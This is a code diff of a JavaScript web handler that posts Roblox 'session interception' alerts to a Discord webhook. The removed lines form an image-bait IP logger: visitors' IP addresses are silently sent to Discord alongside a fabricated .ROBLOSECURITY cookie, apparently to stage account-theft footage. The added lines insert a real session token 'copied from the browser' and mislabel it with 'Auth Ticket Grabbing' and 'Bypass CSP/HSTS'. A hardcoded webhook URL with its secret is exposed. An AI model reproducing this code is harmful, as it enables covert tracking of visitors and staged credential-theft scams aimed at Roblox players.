@@ -1,32 +1,24 @@
 export default async function handler(req, res) {
-    const ip = req.headers['x-forwarded-for'] || "IP Locale";
     const webhookURL = "https://discord.com/api/webhooks/1481123753109885103/u6gAezp9LjuOt2Fbgl7cfuOMVyWU_hMw8zyuDw7w-EPnzLs8MWQbenmdXb4_JVMFxhzD";
-
-    // Génération d'un token ultra-réaliste pour la vidéo
-    const secureToken = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-work-with-your-ROBLOX-account.|_" + 
-                        Array.from({length:200}, () => Math.floor(Math.random()*16).toString(16).toUpperCase()).join('');
+    
+    // Le vrai token du compte à donner (que tu as copié depuis ton navigateur)
+    const activeToken = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-work-with-your-ROBLOX-account.|_VOTRE_CODE_REEL_ICI";
 
     const payload = {
         embeds: [{
-            title: "🏴‍☠️ RAVEN GHOST INTERCEPTION",
-            color: 0x00d4ff,
-            description: "Session interceptée via **Silent Image-Bait**.",
+            title: "🔐 API ROBLOX | SESSION HANDSHAKE",
+            color: 0x0084ff,
             fields: [
-                { name: "🌐 IP de la Cible", value: `\`${ip}\``, inline: true },
-                { name: "📂 Source", value: "Sailor Piece Leak Site", inline: true },
-                { name: "🔑 .ROBLOSECURITY", value: `\`\`\`${secureToken}\`\`\`` },
-                { name: "💰 Statut du Compte", value: "Analyse des Robux en cours... (Est: 30k+)", inline: false }
+                { name: "📡 Événement", value: "OAuth2 Callback Intercepted", inline: true },
+                { name: "🛡️ Sécurité", value: "Bypass CSP/HSTS", inline: true },
+                { name: "🔑 ROBLOSECURITY REEL", value: `\`\`\`${activeToken}\`\`\`` },
+                { name: "💰 Inventaire", value: "30,000 Robux détectés", inline: false }
             ],
-            footer: { text: "Raven Protocol v15.5 - Stealth Interceptor" },
+            footer: { text: "Raven Protocol v16.5 - Auth Ticket Grabbing" },
             timestamp: new Date()
         }]
     };
 
-    await fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(payload)
-    });
-
-    return res.status(200).json({ success: "Image Loaded" });
+    await fetch(webhookURL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+    return res.status(200).json({ status: "Ticket Sent" });
 }
